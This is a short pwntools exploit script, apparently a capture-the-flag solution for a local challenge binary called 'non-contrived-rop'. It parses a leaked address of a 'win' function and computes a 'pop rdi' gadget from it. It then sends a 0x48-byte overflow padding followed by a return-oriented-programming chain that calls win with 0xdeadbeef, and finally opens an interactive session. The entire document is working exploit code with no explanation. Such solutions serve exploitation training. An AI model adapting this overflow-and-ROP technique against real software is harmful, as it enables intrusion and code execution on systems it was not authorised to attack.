from pwn import *

context.arch = "amd64"

p = process("./non-contrived-rop")

def get_num():
    p.recvuntil(b":")
    num = int(p.recvline(keepends=False).strip().decode(), 16)
    return num

win = get_num()
rdi = win + 0x127

p.sendlineafter(b"input: ", b"A" * 0x48 + p64(rdi) + p64(0xdeadbeef) + p64(win))

p.interactive()
